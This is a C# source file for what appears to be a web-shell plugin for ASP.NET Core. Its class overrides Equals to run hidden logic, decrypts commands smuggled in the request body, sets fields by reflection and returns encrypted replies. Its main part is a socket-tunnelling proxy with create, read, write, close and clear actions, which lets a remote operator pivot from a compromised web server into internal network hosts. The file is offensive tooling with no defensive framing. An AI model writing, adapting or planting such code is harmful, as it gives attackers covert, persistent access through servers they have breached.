using System.Net;
using System.Net.Sockets;
using Microsoft.AspNetCore.Http;
using System.Reflection;
using System.Text;
using System.Security.Cryptography;

public class U
{
    public HttpRequest Request;
    public HttpResponse Response;
    public ISession Session;


    public string content;

    public string sessionId;


    private DefaultHttpContext context;

    private object current;

    public string error_msg;
    public Dictionary<string, Object> globals = new Dictionary<string, Object>();


    public static string action;


    public static string targetIP;


    public static string targetPort;


    public static string socketHash;


    public string extraData;


    public override bool Equals(object obj)
    {
        InitAsync(obj);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        try
        {
            dictionary = ProxyAsync(context);
        }
        catch (Exception ex)
        {
            dictionary = new Dictionary<string, string>
            {
                { "status", "fail" },
                { "msg", ex.Message }
            };
        }

        Response.WriteAsync(Encoding.UTF8.GetString(this.EnjsonAndCrypt(dictionary)));
        return false;
    }

    private async Task InitAsync(object obj)
    {
        global();
        this.current = obj;
        this.fillRequestHandler(obj);
        this.fillSessionHandler();
        this.fillParams();
    }


    private void doConnect(IPEndPoint remoteEP)
    {
    }


    private Dictionary<string, string> ProxyAsync(HttpContext page)
    {
        HttpRequest request = page.Request;
        HttpResponse response = page.Response;
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        if (U.action.Equals("create"))
        {
            try
            {
                IPEndPoint ipendPoint = new IPEndPoint(IPAddress.Parse(Dns.GetHostAddresses(U.targetIP)[0].ToString()),
                    int.Parse(U.targetPort));
                Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                IAsyncResult asyncResult = socket.BeginConnect(ipendPoint, null, null);
                bool flag = asyncResult.AsyncWaitHandle.WaitOne(2000, true);
                if (!socket.Connected)
                {
                    socket.Close();
                    throw new ApplicationException("Failed to connect server.");
                }

                socket.EndConnect(asyncResult);
                socket.Blocking = false;
                this.sessionSet("socket_" + U.socketHash, socket);
                dictionary.Add("status", "success");
            }
            catch (Exception ex)
            {
                dictionary.Add("status", "fail");
                dictionary.Add("msg", ex.Message);
            }
        }
        else if (U.action.Equals("close"))
        {
            try
            {
                Socket socket2 = (Socket)this.sessionGet("socket_" + U.socketHash);
                socket2.Close();
                dictionary.Add("status", "success");
            }
            catch (Exception ex2)
            {
                dictionary.Add("status", "fail");
                dictionary.Add("msg", ex2.Message);
            }

            this.sessionRemove("socket_" + U.socketHash);
        }
        else if (U.action.Equals("clear"))
        {
            foreach (string text in this.sessionKeys())
            {
                if (text.StartsWith("socket_"))
                {
                    try
                    {
                        Socket socket = (Socket)this.sessionGet(text);
                        socket.Close();
                    }
                    catch (Exception ex2)
                    {
                    }
                }

                this.sessionRemove(text);
            }

            dictionary.Add("status", "success");
        }
        else if (U.action.Equals("write"))
        {
            try
            {
                Socket socket2 = (Socket)this.sessionGet("socket_" + U.socketHash);
                byte[] array = Convert.FromBase64String(this.extraData);
                socket2.Send(array);
                dictionary.Add("status", "success");
            }
            catch (Exception ex)
            {
                dictionary.Add("status", "fail");
                dictionary.Add("msg", ex.Message);
            }
        }
        else if (U.action.Equals("read"))
        {
            try
            {
                Socket socket2 = (Socket)this.sessionGet("socket_" + U.socketHash);
                byte[] array2 = new byte[10240];
                using (MemoryStream memoryStream = new MemoryStream())
                {
                    using (BinaryWriter binaryWriter = new BinaryWriter(memoryStream))
                    {
                        while (socket2.Available > 0)
                        {
                            int num = socket2.Receive(array2);
                            binaryWriter.Write(array2, 0, num);
                        }

                        dictionary.Add("status", "success");
                        dictionary.Add("msg", Convert.ToBase64String(memoryStream.ToArray()));
                    }
                }
            }
            catch (Exception ex)
            {
                dictionary.Add("status", "fail");
                dictionary.Add("msg", ex.Message);
            }
        }

        return dictionary;
    }


    private void sessionSet(string key, object value)
    {
        string sessionKey = this.Session?.Id ?? this.sessionId;


        Dictionary<string, object> dictionary = (Dictionary<string, object>)this.globals[sessionKey];


        if (dictionary.ContainsKey(key))
        {
            dictionary[key] = value;
        }
        else
        {
            dictionary.Add(key, value);
        }
    }


    private object sessionGet(string key)
    {
        object obj;
        if (this.Session == null)
        {
            obj = ((Dictionary<string, object>)this.globals[this.sessionId])[key];
        }
        else
        {
            obj = ((Dictionary<string, object>)this.globals[this.Session.Id])[key];
        }

        return obj;
    }


    private List<string> sessionKeys()
    {
        List<string> list = new List<string>();
        if (this.Session == null)
        {
            list.AddRange(((Dictionary<string, object>)this.globals[this.sessionId]).Keys);
        }
        else
        {
            list.AddRange(((Dictionary<string, object>)this.globals[this.Session.Id]).Keys);
        }

        return list;
    }


    private void sessionRemove(string key)
    {
        if (this.Session == null)
        {
            ((Dictionary<string, object>)this.globals[this.sessionId]).Remove(key);
        }
        else
        {
            ((Dictionary<string, object>)this.globals[this.Session.Id]).Remove(key);
        }
    }

    private byte[] EnjsonAndCrypt(Dictionary<string, string> result)
    {
        byte[] bytes = Encoding.UTF8.GetBytes(this.Dict2Json(result));
        return this.Encrypt(bytes);
    }

    private string Dict2Json(Dictionary<string, string> dict)
    {
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.Append("{");
        foreach (string text in dict.Keys)
        {
            stringBuilder.Append("\"" + text + "\":\"");
            stringBuilder.Append(Convert.ToBase64String(Encoding.UTF8.GetBytes(dict[text])) + "\",");
        }

        if (stringBuilder.ToString().EndsWith(","))
        {
            stringBuilder.Remove(stringBuilder.Length - 1, 1);
        }

        stringBuilder.Append("},");
        stringBuilder.Remove(stringBuilder.Length - 1, 1);
        return stringBuilder.ToString();
    }

    private void global()
    {
        Assembly[] assemblies = AppDomain.CurrentDomain.GetAssemblies();


        string targetAssemblyFullName = "Echo, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null";
        var targetAssembly =
            assemblies.FirstOrDefault(assembly => assembly.GetName().FullName.Equals(targetAssemblyFullName));

        if (targetAssembly != null)
        {
            string targetTypeName = "U";
            Type targetType = targetAssembly.GetType(targetTypeName);

            if (targetType != null)
            {
                object instance = Activator.CreateInstance(targetType);
                FieldInfo instancesField =
                    instance.GetType().GetField("globals", BindingFlags.Static | BindingFlags.Public);
                globals = instancesField.GetValue(null) as Dictionary<string, object>;
            }
        }
    }

    private void init(object obj)
    {
        /*
         * .net core中重构体系，所以HttpContext.Current不存在类似的
         */
        global();
        this.current = obj;
        this.fillRequestHandler(obj);
        this.fillSessionHandler();
        this.fillParams();
    }


    private void fillRequestHandler(object obj)
    {
        this.context = (DefaultHttpContext)obj;
        this.Response = this.context.Response;
        this.Request = this.context.Request;
        this.Response.ContentType = "charset=utf-8";
    }

    private void fillSessionHandler()
    {
        try
        {
            this.Session = ((HttpContext)this.context).Session;

            this.Session.Set("test", Encoding.UTF8.GetBytes("test"));

            if (!globals.ContainsKey(this.Session.Id))
            {
                if (globals != null)
                {
                    globals[this.Session.Id] = new Dictionary<string, object>();
                }
            }
        }
        catch (Exception ex)
        {
            if (this.sessionId != null)
            {
                if (!globals.ContainsKey(this.sessionId))
                {
                    if (globals != null)
                    {
                        globals[this.sessionId] = new Dictionary<string, object>();
                    }
                }
            }
            else
            {
                error_msg = ex.Message;
            }
        }
    }

    private void fillParams()
    {
        using (var memoryStream = new MemoryStream())
        {
            context.Request.Body.Seek(0, SeekOrigin.Begin);
            context.Request.Body.CopyTo(memoryStream);


            memoryStream.Seek(0, SeekOrigin.Begin);


            byte[] array = memoryStream.ToArray();


            array = Decrypt(array);


            Dictionary<string, string> extraData = getExtraData(array);


            if (extraData != null)
            {
                foreach (var key in extraData.Keys)
                {
                    var field = this.GetType().GetField(key);
                    if (field != null)
                    {
                        field.SetValue(this, extraData[key]);
                    }
                }
            }
        }
    }

    private byte[] Encrypt(byte[] data)
    {
        var EncryptFunc = ((DefaultHttpContext)current).Items["EncryptFunc"];
        MethodInfo method = (MethodInfo)EncryptFunc.GetType().GetProperty("Method").GetValue(EncryptFunc);


        byte[] array;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            array = new RijndaelManaged().CreateEncryptor(bytes, bytes).TransformFinalBlock(data, 0, data.Length);
        }
        else
        {
            array = (byte[])method.Invoke(null, new object[] { data });
        }

        return array;
    }

    private byte[] Decrypt(byte[] data)
    {
        var DecryptFunc = ((DefaultHttpContext)current).Items["DecryptFunc"];
        MethodInfo method = (MethodInfo)DecryptFunc.GetType().GetProperty("Method").GetValue(DecryptFunc);

        byte[] result;
        if (method == null)
        {
            byte[] bytes = Encoding.Default.GetBytes(this.Session.Keys.ToArray().ToString());
            using (Aes aesAlg = Aes.Create())
            {
                aesAlg.Key = bytes;
                aesAlg.IV = bytes;

                ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);
                result = decryptor.TransformFinalBlock(data, 0, data.Length);
            }
        }
        else
        {
            result = (byte[])method.Invoke(null, new object[] { data });
        }

        return result;
    }


    private Dictionary<string, string> getExtraData(byte[] fullData)
    {
        this.context.Request.Body.Seek(0, SeekOrigin.Begin);
        int num = this.IndexOf(fullData, new byte[] { 126, 126, 126, 126, 126, 126 });
        byte[] array = new List<byte>(fullData).GetRange(num + 6, fullData.Length - num - 6).ToArray();
        string @string = Encoding.Default.GetString(array);
        Dictionary<string, string> dictionary = new Dictionary<string, string>();
        string[] array2 = @string.Split(new char[] { ',' });
        foreach (string text in array2)
        {
            string[] array4 = text.Split(new char[] { ':' });
            if (array4.Length == 2)
            {
                string text2 = array4[0];
                string string2 = Encoding.UTF8.GetString(Convert.FromBase64String(array4[1]));
                dictionary.Add(text2, string2);
            }
        }

        return dictionary;
    }

    internal int IndexOf(byte[] srcBytes, byte[] searchBytes)
    {
        int num = 0;
        int result;
        if (srcBytes == null)
        {
            result = -1;
        }
        else if (searchBytes == null)
        {
            result = -1;
        }
        else if (srcBytes.Length == 0)
        {
            result = -1;
        }
        else if (searchBytes.Length == 0)
        {
            result = -1;
        }
        else if (srcBytes.Length < searchBytes.Length)
        {
            result = -1;
        }
        else
        {
            for (int i = 0; i < srcBytes.Length - searchBytes.Length; i++)
            {
                if (srcBytes[i] == searchBytes[0])
                {
                    if (searchBytes.Length == 1)
                    {
                        return i;
                    }

                    bool flag = true;
                    for (int j = 1; j < searchBytes.Length; j++)
                    {
                        if (srcBytes[i + j] != searchBytes[j])
                        {
                            flag = false;
                            break;
                        }
                    }

                    if (flag)
                    {
                        num++;
                        if (num == 2)
                        {
                            return i;
                        }
                    }
                }
            }

            result = -1;
        }

        return result;
    }
}